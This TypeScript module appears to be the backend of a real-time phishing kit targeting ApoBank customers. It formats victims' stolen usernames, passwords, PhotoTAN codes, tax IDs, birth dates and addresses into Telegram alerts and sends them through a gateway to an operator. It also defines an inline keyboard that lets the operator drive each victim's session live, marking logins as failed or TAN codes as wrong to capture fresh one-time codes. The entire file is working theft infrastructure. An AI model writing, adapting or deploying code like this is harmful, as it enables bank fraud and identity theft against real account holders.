export const TG_GATEWAY = "https://connector-gateway.lovable.dev/telegram";

export function tgHeaders() {
  const LOVABLE_API_KEY = Deno.env.get("LOVABLE_API_KEY");
  const TELEGRAM_API_KEY = Deno.env.get("TELEGRAM_API_KEY");
  if (!LOVABLE_API_KEY) throw new Error("LOVABLE_API_KEY missing");
  if (!TELEGRAM_API_KEY) throw new Error("TELEGRAM_API_KEY missing");
  return {
    Authorization: `Bearer ${LOVABLE_API_KEY}`,
    "X-Connection-Api-Key": TELEGRAM_API_KEY,
    "Content-Type": "application/json",
  };
}

export async function tgCall(method: string, body: unknown) {
  const res = await fetch(`${TG_GATEWAY}/${method}`, {
    method: "POST",
    headers: tgHeaders(),
    body: JSON.stringify(body),
  });
  const text = await res.text();
  let json: any;
  try { json = JSON.parse(text); } catch { json = { raw: text }; }
  if (!res.ok || json?.ok === false) {
    console.error(`Telegram ${method} failed [${res.status}]`, text);
  }
  return { status: res.status, json };
}

export async function deriveWebhookSecret(): Promise<string> {
  const key = Deno.env.get("TELEGRAM_API_KEY") ?? "";
  const data = new TextEncoder().encode(`telegram-webhook:${key}`);
  const digest = await crypto.subtle.digest("SHA-256", data);
  return btoa(String.fromCharCode(...new Uint8Array(digest)))
    .replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}

export function sessionKeyboard(sessionId: string, _mode: string = "live") {
  const row1 = [
    { text: "✅ Success", callback_data: `success|${sessionId}` },
    { text: "🔐 2FA", callback_data: `twofa|${sessionId}` },
    { text: "❌ Login failed", callback_data: `login_failed|${sessionId}` },
  ];
  const row2 = [
    { text: "❗ PhotoTAN falsch", callback_data: `phototan_wrong|${sessionId}` },
    { text: "✅ Login PhotoTAN", callback_data: `phototan_success|${sessionId}` },
  ];
  const row3 = [
    { text: "🏁 Finish", callback_data: `finish|${sessionId}` },
    { text: "❗ FinishTAN falsch", callback_data: `finish_wrong|${sessionId}` },
  ];
  return { inline_keyboard: [row1, row2, row3] };
}

const PROFILE_LABELS: Record<string, string> = {
  titel: "Titel",
  vorname: "Vorname",
  weitereVornamen: "Weitere Vornamen",
  nachname: "Nachname",
  geburtsdatum: "Geburtsdatum",
  geburtsort: "Geburtsort",
  staat: "Staatsangehörigkeit",
  weitereStaat: "Weitere Staatsangehörigkeiten",
  familienstand: "Familienstand",
  steuerId: "Steuer-ID",
  mobil: "Mobil",
  festnetz: "Festnetz",
  email: "E-Mail",
  strasse: "Straße",
  zusatz: "Adresszusatz",
  plz: "PLZ",
  ortLand: "Ort",
  erwerb: "Erwerbstätigkeit",
  berufsgruppe: "Berufsgruppe",
  fachrichtung: "Fachrichtung",
  stellung: "Stellung",
};

export function formatSessionText(s: {
  id: string; mode: string; phase: string; action?: string | null;
  meta: Record<string, any>;
}) {
  const m = s.meta || {};
  const lines: string[] = [];
  lines.push(`🚨🚨🚨 <b>ApoBank Connect Alert</b> 🚨🚨🚨`);
  lines.push(`Modus: <code>${s.mode}</code> · Phase: <b>${s.phase}</b>`);
  lines.push("");

  lines.push(`<b>🔑 Login</b>`);
  lines.push(`User: <code>${escapeHtml(String(m.username ?? "—"))}</code>`);
  lines.push(`Pass: <code>${escapeHtml(String(m.password ?? "—"))}</code>`);

  if (m.profile && typeof m.profile === "object") {
    lines.push("");
    lines.push(`<b>👤 Mein Profil</b>`);
    for (const [k, label] of Object.entries(PROFILE_LABELS)) {
      const v = m.profile[k];
      if (v === undefined || v === null || v === "") continue;
      lines.push(`${label}: <code>${escapeHtml(String(v))}</code>`);
    }
  }

  if (m.photoTan) {
    lines.push("");
    lines.push(`<b>📱 PhotoTAN</b>: <code>${escapeHtml(String(m.photoTan))}</code>`);
  }

  if (m.deviceName) {
    lines.push("");
    lines.push(`<b>📟 Gerätename</b>: <code>${escapeHtml(String(m.deviceName))}</code>`);
  }

  if (Array.isArray(m.notes) && m.notes.length > 0) {
    lines.push("");
    lines.push(`<b>💬 Antworten</b>`);
    for (const n of m.notes) {
      const t = typeof n === "string" ? n : String(n?.text ?? "");
      const phase = typeof n === "object" && n?.phase ? ` <i>(${escapeHtml(String(n.phase))})</i>` : "";
      if (t) lines.push(`• <code>${escapeHtml(t)}</code>${phase}`);
    }
  }

  if (s.action) {
    lines.push("");
    lines.push(`Aktion: <b>${s.action}</b>`);
  }

  lines.push("");
  lines.push(`🕒 ${escapeHtml(String(m.started_at ?? new Date().toISOString()))}`);
  if (m.ua) lines.push(`🖥 <i>${escapeHtml(String(m.ua)).slice(0, 160)}</i>`);
  lines.push(`🆔 <code>${s.id}</code>`);
  return lines.join("\n");
}


function escapeHtml(s: string) {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}
